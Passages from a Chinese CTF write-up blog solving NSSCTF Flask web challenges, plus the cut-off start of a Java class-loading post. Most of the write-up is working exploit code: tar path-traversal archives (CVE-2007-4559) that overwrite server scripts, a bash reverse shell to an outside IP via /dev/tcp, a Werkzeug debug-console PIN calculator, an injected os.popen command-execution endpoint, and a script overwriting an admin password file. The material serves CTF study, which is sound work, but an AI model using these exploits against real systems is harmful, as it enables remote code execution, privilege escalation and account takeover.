class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;tar&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename) <span class="keyword">and</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename <span class="keyword">and</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a tarfile&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> os.path.islink(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">oct</span>(os.stat(filepath).st_mode)[-<span class="number">3</span>:] != <span class="string">&#x27;444&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;su ctf -c /tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(os.environ)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230329195008532.png" alt="image-20230329195008532"></p><p>这里相较于v2，就多了这两行代码</p><p>第一个是判断文件内容是否为软链接</p><p>第二个是判断上传的文件权限是不是444</p><p><strong>预期解</strong></p><p><strong>CVE-2007-4559</strong>漏洞，可以通过tar.extractall()函数的漏洞，解压文件时候，覆盖掉目录中的文件</p><p>flask开启了debug=true模式，会有/console控制台，计算出PIN码即可进入控制台。</p><p>覆盖<code>tmp/clean.sh</code>,执行命令，拿到shell，flag的权限是root，可以通过算PIN码，提权执行命令，因为<code>main.py</code>的权限是<code>root</code></p><p>main.py就是debug控制台那，是root权限，所以就可以通过控制台来读取flag</p><p>反弹shell的原因就是为了得获取靶机中的东西来计算pin码</p><ol><li>上传tar文件，覆盖掉clean.sh，调用clean()函数调用exp.sh，进行反弹shell<br><strong>exp.sh</strong>如下：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/666 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p>生成的时候得加权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exp.sh</span><br></pre></td></tr></table></figure><p>x是可执行的意思</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeFileName</span>(<span class="params">filename</span>):</span><br><span class="line">    filename.name = <span class="string">&#x27;../../../../tmp/clean.sh&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">    tar.add(<span class="string">&#x27;exp.sh&#x27;</span>, <span class="built_in">filter</span>=changeFileName)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://43.143.7.127:28589/upload&#x27;</span></span><br><span class="line">    response = req.post(url=url, files=&#123;<span class="string">&quot;file&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://43.143.7.127:28589/clean&#x27;</span></span><br><span class="line">    response = req.post(url)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload()</span><br><span class="line">    clean()</span><br></pre></td></tr></table></figure><p>然后先生成一下tar包</p><p>这里就是先进行tar包的上传，上传之后，就会进行解压，解压之后就会覆盖掉clean.sh,然后在访问/clean就会执行代码反弹shell了</p><p><img src="../images/image-20230329203140055.png" alt="image-20230329203140055"></p><p>这里不能在本地弹，本地弹不上去，只能在linux下弹</p><p><img src="../images/image-20230329203255973.png" alt="image-20230329203255973"></p><p>flag文件中并没有flag，flag应该在you_could_never_guess_the_flag_path中，但是只有root用户能够读取，发现main.py是root权限运行，可以计算PIN码进入console控制台获取到flag</p><p><strong>生成pin码的脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485376912775&#x27;</span>,<span class="comment">#  /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="string">&#x27;96cec10d3d9307792745ec3b85c8962099f22e5a1ea6fc770c8ef01846a5fdcb0335fa255abc4345c0bc72c44131a11f&#x27;</span><span class="comment">#  /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1./etc/machine-id    3./proc/self/cgroup  这道题是用这两个</p><p><img src="../images/image-20230329205003667.png" alt="image-20230329205003667"></p><p>最后拿到flag</p><p><strong>非预期解</strong></p><p><em>Debug模式下</em>，当<code>app.py</code>内容发生变化时，<a href="https://so.csdn.net/so/search?q=flask&amp;spm=1001.2101.3001.7020">flask</a>会重新加载</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1.14.71.254:28077/&#x27;</span></span><br><span class="line">filename = <span class="string">r&quot;main.py&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeFileName</span>(<span class="params">filename</span>):</span><br><span class="line">    filename.name=<span class="string">&#x27;../../../app/main.py&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">    tar.add(filename,<span class="built_in">filter</span>=changeFileName)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">rawurl</span>):</span><br><span class="line"></span><br><span class="line">    url = rawurl + <span class="string">&quot;upload&quot;</span></span><br><span class="line">    response = req.post(url = url, files = &#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>(<span class="params">rawurl</span>):</span><br><span class="line">    url = rawurl + <span class="string">&#x27;download?filename=ls&#x27;</span></span><br><span class="line">    response = req.get(url)</span><br><span class="line">    <span class="built_in">print</span>(response.content)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload(url)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    getFlag(url)</span><br></pre></td></tr></table></figure><p><strong>main.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> os.popen(filename).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230329213526571.png" alt="image-20230329213526571"></p><p>这里就是使用上面的那个cve进行main.py的覆盖，覆盖后会进行重载，就是自己写一段main.py的代码，可以进行命令执行的，main.py是root的用户</p><p>然后就可以成功rce了</p><p>这三道题收获挺多</p><h2 id="NSSRound-7-Team-新的博客"><a href="#NSSRound-7-Team-新的博客" class="headerlink" title="[NSSRound#7 Team]新的博客"></a>[NSSRound#7 Team]新的博客</h2><p>考点</p><p><img src="../images/image-20230329213834003.png" alt="image-20230329213834003"></p><p>题目</p><p><img src="../images/image-20230330192411011.png" alt="image-20230330192411011"></p><p><img src="../images/image-20230330193239428.png" alt="image-20230330193239428"></p><p>经过两次base和hex解密就得到<code>/static/www.tar.gz</code></p><p>然后访问就会下载下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app/                                                                                                0000777 0000000 0000000 00000000000 14332615660 010036  5                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        app/conf/                                                                                           0000777 0000000 0000000 00000000000 14332615660 010763  5                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        app/conf/userinfo.json                                                                              0000777 0000000 0000000 00000000222 14332613615 013505  0                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        &#123;</span><br><span class="line">&quot;admin&quot;: &quot;c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec&quot;</span><br><span class="line">&#125;                                                                                                                                                                                                                                                                                                                                                                              app/userData/                                                                                       0000777 0000000 0000000 00000000000 14332615671 011610  5                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        app/userData/admin/                                                                                 0000777 0000000 0000000 00000000000 14332615671 012700  5                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        app/userData/admin/flag                                                                             0000777 0000000 0000000 00000000070 14332613676 013537  0                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        想多了这里没有flag</span><br><span class="line"></span><br><span class="line">只有admin才能获得flag   </span><br></pre></td></tr></table></figure><p>通过这个下载的内容我们知道它的目录文件结构</p><p><img src="../images/image-20230330193459337.png" alt="image-20230330193459337"></p><p><img src="../images/image-20230330193539095.png" alt="image-20230330193539095"></p><p>点击博客备份的话会下载用户名.tar.gz文件，所以知道一个结构</p><p><img src="../images/image-20230330193641866.png" alt="image-20230330193641866"></p><p>我们和上一个目录结构对比一下，也有一个flag，然后上面一个用户名，我们根据文件明猜测所有的用户都放在userData之下，包括admin用户。</p><p>所以非预期解就是利用博客恢复功能，上传tar.gz文件，利用这个flag软连接指向/app/conf/userinfo.json，然后再上传一个我们修改后的admin的sha1的json文件，就可以修改admin的密码</p><p>这里因为与软链接连接过后，修改目标文件的话，源文件也会跟着修改，所以我们就直接去修改这个用户名.tar.gz，然后app/conf/userinfo.json也会被修改，所以就是可以自定义admin的密码了(因为还是那个漏洞，就是解压时会覆盖掉目录中的文件)</p><p><strong>预期解</strong></p><p>预期解是利用目录穿越直接覆盖掉userinfo.json文件吧，在搞预期解的时候真的非常头疼，一直手撸不出来那个目录结构，同时利用官方WP的脚本一直报错，就很难受，无奈只能改一下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, hashlib, json</span><br><span class="line"> </span><br><span class="line">username = <span class="string">&#x27;qingfeng&#x27;</span> <span class="comment"># 你注册时用的用户名，尽量别有奇怪的符号</span></span><br><span class="line">admin_passwd = <span class="string">&#x27;admin&#x27;</span> <span class="comment"># 之后要使用admin账户登陆时的密码</span></span><br><span class="line"> </span><br><span class="line">os.makedirs(<span class="string">&#x27;conf&#x27;</span>)</span><br><span class="line">os.makedirs(os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>, username]))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(os.sep.join([os.getcwd(), <span class="string">&#x27;conf&#x27;</span>, <span class="string">&#x27;userinfo.json&#x27;</span>]), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> tFile:</span><br><span class="line">    tFile.write(json.dumps(&#123;<span class="string">&#x27;admin&#x27;</span>: hashlib.sha512(admin_passwd.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">userDataDir = os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>])</span><br><span class="line">os.system(<span class="string">f&#x27;cd &quot;<span class="subst">&#123;userDataDir&#125;</span>&quot; &amp;&amp; tar cPzvf upload.tar.gz <span class="subst">&#123;username&#125;</span>/../../conf/userinfo.json&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="NSSRound-3-Team-This1sMysql"><a href="#NSSRound-3-Team-This1sMysql" class="headerlink" title="[NSSRound#3 Team]This1sMysql"></a>[NSSRound#3 Team]This1sMysql</h2><p>考点</p><p><img src="../images/image-20230330202900747.png" alt="image-20230330202900747"></p><p>题目</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;NSSRound-1-Basic-basic-check&quot;&gt;&lt;a href=&quot;#NSSRound-1-Basic-basic-check&quot; class=&quot;headerlink&quot; title=&quot;[NSSRound#1 Basic]basic_check&quot;&gt;&lt;/a&gt;[</summary>
      
    
    
    
    
    <category term="nssctf web" scheme="https://ke1nys.github.io/tags/nssctf-web/"/>
    
  </entry>
  
  <entry>
    <title>动态类加载</title>
    <link href="https://ke1nys.github.io/posts/fcb7f5f0.html"/>
    <id>https://ke1nys.github.io/posts/fcb7f5f0.html</id>
    <published>2023-03-20T08:45:43.000Z</published>
    <updated>2023-04-06T06:48:36.161Z</updated>
    
    <content type="html"><![CDATA[<p>视频地址 <a href="https://www.bilibili.com/video/BV16h411z7o9?p=4&amp;vd_source=bacfffe46b930fda5761b63367eb298c">动态类加载</a></p><p><img src="../images/image-20230320171305517.png" alt="image-20230320171305517"></p><p>学习这个东西得需要两个代码</p><p><strong>Person.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span 